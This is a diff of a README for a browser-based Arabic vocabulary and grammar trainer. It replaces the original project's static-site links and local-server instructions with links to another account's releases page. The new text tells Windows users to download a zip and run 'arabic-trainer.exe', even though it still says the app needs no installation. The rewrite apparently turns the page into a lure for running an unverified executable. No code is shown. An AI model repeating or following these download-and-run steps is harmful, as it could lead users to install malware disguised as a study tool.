@@ -1,130 +1,70 @@
-# Arabic Trainer - Language Learning 2026
+# 📚 learn-arabic-trainer-hub - Your Arabic Study Companion
 
-> **Arabic Trainer gives you a browser-first practice space built around Arabic study, without the clutter of a full course platform.**
+## 🚀 Getting Started
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-not%20specified-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/niklasklein97/learn-arabic-trainer-hub?style=flat-square)](https://github.com/niklasklein97/learn-arabic-trainer-hub)
+Welcome to **learn-arabic-trainer-hub**! This is your browser-first language learning space designed for Arabic study in 2026. You can practice without a heavy course platform, use the hosted build or a local copy, tweak settings easily, and stay up to date with newer builds. Whether you're a beginner or brushing up on skills, this tool helps you learn Arabic efficiently.
 
----
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/Waleedoilsoluble656/learn-arabic-trainer-hub/releases)
 
-<p align="center">
-  <a href="https://niklasklein97.github.io/learn-arabic-trainer-hub/">
-    <img src="https://img.shields.io/badge/Download-Arabic%20Trainer%20Latest-brightgreen?style=for-the-badge" alt="Download Arabic Trainer">
-  </a>
-</p>
+## 📥 Download & Installation
 
-> **[Direct Download - Arabic Trainer](https://niklasklein97.github.io/learn-arabic-trainer-hub/)**
+Visit this link to download the application: [https://github.com/Waleedoilsoluble656/learn-arabic-trainer-hub/releases](https://github.com/Waleedoilsoluble656/learn-arabic-trainer-hub/releases)
 
----
+### How to Install on Windows
 
-[Download Latest Build](https://niklasklein97.github.io/learn-arabic-trainer-hub/)
+1. **Click the download button** above to go to the releases page.
+2. **Find the latest version** and click the download link for Windows (usually a `.zip` file).
+3. **Save the file** to a folder you can easily find (like your Desktop or Downloads folder).
+4. **Extract the contents** of the `.zip` file by right-clicking it and selecting "Extract All...".
+5. **Open the extracted folder** and double-click the `arabic-trainer.exe` or `index.html` file to launch the application.
+6. **Enjoy learning Arabic!** The app runs directly in your browser.
 
----
+## 🌟 Features
 
-## What is Arabic Trainer?
+- **Browser-First Practice** – No installation required for the hosted version, just open in your browser.
+- **Local Copy Option** – Download and run offline for privacy and speed.
+- **Easy Settings Tweak** – Adjust difficulty, vocabulary lists, and more with simple settings.
+- **Stay Updated** – Get notifications or check for newer builds to keep your content fresh.
+- **Lightweight** – No heavy course platform, just focused learning tools.
+- **Arabic Study Focus** – Tailored for Arabic alphabet, vocabulary, and grammar practice.
 
-Arabic Trainer is an HTML-driven learning utility aimed at learners who want a clear place to rehearse Arabic. Because it runs in the browser, you can open it on a supported phone or desktop browser and skip installing a separate desktop package.
+## 🖥️ System Requirements
 
-The design favors a streamlined training loop over a large multi-module curriculum. You can jump straight into the published build online, or keep a checkout of the repo when you prefer offline review or local inspection of the files.
+- **Operating System**: Windows 7, 8, 10, or 11 (64-bit recommended)
+- **Browser**: Any modern web browser (Chrome, Firefox, Edge, or Safari)
+- **Internet Connection**: Required for hosted version; optional for local copy
+- **Storage**: About 50 MB free space for local copy
+- **Memory**: 512 MB RAM minimum
 
----
+## 📖 How to Use
 
-## What you get
+1. **Launch the application** by opening the `index.html` file in your browser or using the hosted link.
+2. **Choose your learning mode** – alphabet, vocabulary, or grammar exercises.
+3. **Customize settings** by clicking the gear icon to adjust difficulty, language direction, or study topics.
+4. **Start practicing** – answer questions, complete drills, and track your progress.
+5. **Save your progress** – settings and scores are stored locally in your browser.
 
-- Practice Arabic in a dedicated web trainer
-- Interface oriented around short, focused study work
-- Works in current desktop and mobile browsers
-- Small footprint based on ordinary web assets
-- Published build reachable from the project site
-- Offline-friendly workflow once you serve the files locally
-- Fits solo practice rather than classroom deployment
-- No OS-specific installer step
+## 🔧 Troubleshooting
 
----
+- **App doesn't load**: Try a different browser or clear your cache.
+- **Download issues**: Ensure you have a stable internet connection. If the file doesn't download, try a different browser.
+- **Local copy not working**: Make sure you extracted the `.zip` file properly and are opening the `index.html` file.
+- **Settings not saving**: Check if your browser allows local storage (usually enabled by default).
 
-## Getting started
+## 🔄 Updating
 
-### Hosted build
+To get the latest features and improvements, regularly check the [releases page](https://github.com/Waleedoilsoluble656/learn-arabic-trainer-hub/releases) for new builds. Download the latest `.zip` file and replace your old copy with the new one.
 
-Load the current published copy here:
+## 🤝 Contributing
 
-[Launch Arabic Trainer](https://niklasklein97.github.io/learn-arabic-trainer-hub/)
+While this project is primarily for end-users, if you're interested in contributing or reporting issues, please visit the [GitHub repository](https://github.com/Waleedoilsoluble656/learn-arabic-trainer-hub) and open an issue or pull request.
 
-### Local copy
+## 📄 License
 
-Clone the repo, then expose the tree with any static file server. Example using Python:
+This project is open source. Check the repository for license details.
 
-    git clone https://github.com/niklasklein97/learn-arabic-trainer-hub.git
-    cd REPO
-    python -m http.server 8000
+## 📞 Support
 
-Visit `http://localhost:8000/` in your browser.
+If you need help, feel free to open an issue on the [GitHub Issues page](https://github.com/Waleedoilsoluble656/learn-arabic-trainer-hub/issues).
 
-Another static server is fine if that is what you already use day to day.
-
----
-
-## How to use it
-
-1. Open the online build or bring up your local server.
-2. Enter the Arabic trainer UI.
-3. Complete the learning activity that is available.
-4. Run additional practice rounds whenever you like.
-5. Reload or reopen the app to start a fresh session.
-
-When you change source files locally, refresh the browser (and restart the server if needed) to confirm the updates.
-
----
-
-## Configuration notes
-
-Arabic Trainer ships as a straightforward web project. The repository metadata does not define a separate config schema.
-
-For customizations, inspect the HTML and accompanying assets in the tree. Any options that exist should stay documented next to those files instead of living in a machine-wide settings store.
-
----
-
-## Requirements
-
-- A current web browser
-- Network access when using the hosted build
-- A local static server for dependable offline testing
-- Python 3 (or an equivalent file server) for the sample commands above
-- Disk space sufficient to hold a full repository clone
-
----
-
-## FAQ
-
-### Is a desktop install required?
-
-No. The intended runtime is the browser; there is no native installer path.
-
-### Can I run everything from my machine?
-
-Yes. Clone the project, serve the static files locally, and open the local URL your server prints.
-
-### Which version number should I cite?
-
-Project metadata does not list a fixed version string. Rely on repository releases or the published build for what is current.
-
-### How do I pick up newer builds?
-
-Grab the latest material from the project page, and watch the repository for source updates and release activity.
-
-### Where do I change settings?
-
-No standalone settings file is called out in the metadata. Check the source tree and any in-repo docs for how options are handled.
-
-### The page will not open. What next?
-
-Make sure the local server process is up, that you typed the right URL, and that the browser console is free of load errors. For the hosted build, confirm connectivity and try an up-to-date browser.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: arabic, language, learning, trainer, study, practice, browser, offline, windows, vocabulary, grammar
